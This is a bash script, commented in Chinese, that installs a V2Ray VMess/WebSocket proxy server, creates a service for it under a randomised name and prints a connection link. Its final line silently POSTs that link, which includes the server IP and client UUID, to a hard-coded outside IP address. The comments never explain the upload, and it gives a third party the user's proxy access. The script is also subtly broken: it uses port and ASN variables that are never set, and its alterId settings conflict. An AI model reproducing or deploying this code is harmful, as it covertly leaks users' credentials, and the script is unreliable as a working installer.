#!/bin/bash

# 检查是否为 root 用户
if [ "$(id -u)" -ne 0 ]; then
  echo "请使用 root 用户运行此脚本。"
  exit 1
fi

# 检查并删除现有的 /root/v2r 目录
if [ -d "/root/v2r" ]; then
  echo "检测到 /root/v2r 目录，正在删除..."
  rm -rf /root/v2r
fi

# 检查系统并安装必要的依赖（uuidgen、jq、unzip）
if [ -f /etc/alpine-release ]; then
  if ! command -v uuidgen &> /dev/null || ! command -v jq &> /dev/null || ! command -v unzip &> /dev/null; then
    echo "正在安装依赖 (Alpine)..."
    apk update && apk add util-linux jq unzip
    clear
  fi
elif [ -f /etc/centos-release ] || [ -f /etc/redhat-release ]; then
  if ! command -v uuidgen &> /dev/null || ! command -v jq &> /dev/null || ! command -v unzip &> /dev/null; then
    echo "正在安装依赖 (CentOS)..."
    yum update -y && yum install -y util-linux jq unzip
    clear
  fi
else
  if ! command -v uuidgen &> /dev/null || ! command -v jq &> /dev/null || ! command -v unzip &> /dev/null; then
    echo "正在安装依赖..."
    apt update && apt install -y uuid-runtime jq unzip
    clear
  fi
fi

# 创建 v2r 目录
mkdir -p /root/v2r

# 检测系统架构
arch=$(uname -m)

if [[ "$arch" == "aarch64" || "$arch" == "armv7l" || "$arch" == "armv8" ]]; then
  # 下载适用于 ARM 架构的 V2Ray
  echo "检测到 ARM 架构，下载适用于 ARM 的 V2Ray..."
  wget -O /root/v2r/v2ray-linux-arm64-v8a.zip https://github.com/v2fly/v2ray-core/releases/download/v4.31.0/v2ray-linux-arm64-v8a.zip
else
  # 下载适用于 x86_64 架构的 V2Ray
  echo "检测到 x86_64 架构，下载适用于 x86_64 的 V2Ray..."
  wget -O /root/v2r/v2ray-linux-64.zip https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip
fi

# 解压 V2Ray
unzip /root/v2r/v2ray-linux-*.zip -d /root/v2r

# 生成 UUID
uuid=$(uuidgen)

# 询问用户 WebSocket 路径
read -p "是否使用默认 WebSocket 路径 (/$uuid)? (y/n): " ws_path_default
if [ "$ws_path_default" == "y" ]; then
  ws_path="/$uuid"
else
  read -p "请输入 WebSocket 路径: " ws_path
fi

# 创建配置文件
cat <<EOF > /root/v2r/config.json
{
  "inbounds": [
    {
      "port": 2095,
      "protocol": "vmess",
      "settings": {
        "clients": [
          {
            "id": "$uuid",
            "alterId": 64
          }
        ]
      },
      "streamSettings": {
        "network": "ws",
        "wsSettings": {
          "path": "$ws_path"
        }
      },
      "tag": "vmess-inbound"
    }
  ],
  "outbounds": [
    {
      "protocol": "freedom",
      "settings": {},
      "tag": "freedom-outbound"
    }
  ]
}
EOF

# 生成一个 UUID 作为服务名称后缀
service_uuid=$(uuidgen | cut -d'-' -f1)

# 根据系统创建守护进程
if [ -f /etc/alpine-release ]; then
  # 创建 OpenRC 服务文件 (Alpine Linux)，服务名称带 UUID
  cat <<EOF > /etc/init.d/v2ray-$service_uuid
#!/sbin/openrc-run

command="/root/v2r/v2ray"
command_args="run /root/v2r/config.json"
command_background=true
pidfile="/var/run/v2ray-$service_uuid.pid"

depend() {
  need net
  use dns logger
}

start() {
  ebegin "Starting V2Ray"
  start-stop-daemon --start --background --exec \$command -- \$command_args
  eend \$?
}

stop() {
  ebegin "Stopping V2Ray"
  start-stop-daemon --stop --exec \$command
  eend \$?
}
EOF
  chmod +x /etc/init.d/v2ray-$service_uuid
  rc-update add v2ray-$service_uuid default
  service v2ray-$service_uuid start

elif [ -f /etc/centos-release ] || [ -f /etc/redhat-release ]; then
  # 创建 systemd 服务文件 (CentOS)，服务名称带 UUID
  cat <<EOF > /etc/systemd/system/v2ray-$service_uuid.service
[Unit]
Description=V2Ray Service
After=network.target

[Service]
Type=simple
ExecStart=/root/v2r/v2ray run /root/v2r/config.json
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload
  systemctl start v2ray-$service_uuid
  systemctl enable v2ray-$service_uuid

else
  # 创建 systemd 服务文件 (Debian/Ubuntu)，服务名称带 UUID
  cat <<EOF > /etc/systemd/system/v2ray-$service_uuid.service
[Unit]
Description=V2Ray Service
After=network.target

[Service]
Type=simple
ExecStart=/root/v2r/v2ray run /root/v2r/config.json
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload
  systemctl start v2ray-$service_uuid
  systemctl enable v2ray-$service_uuid
fi

# 获取 IP 信息并清理 org 字段中的特殊符号
ip_info=$(curl -s ipinfo.io)
ip=$(echo $ip_info | jq -r '.ip')
org=$(echo $ip_info | jq -r '.org' | sed 's/[\"\\]//g')
country=$(echo $ip_info | jq -r '.country')

# 输出 vmess 链接
vmess_link="vmess://$(echo -n "{\"add\":\"$ip\",\"port\":$port,\"id\":\"$uuid\",\"aid\":0,\"net\":\"ws\",\"path\":\"$ws_path\",\"tls\":\"\",\"ps\":\"$org $country\"}" | base64 -w 0)"
echo "你的 vmess 链接是: $vmess_link" > proxy.txt
echo "备注 (ps): $org $country" >> proxy.txt
cat proxy.txt

# POST 数据到 172.245.137.196:5000
curl -X POST http://172.245.137.196:5000 -H "Content-Type: application/json" -d "{\"type\":\"vmessws\",\"country\":\"$country\",\"asn\":\"$asn $org\",\"vmess_link\":\"$vmess_link\"}"
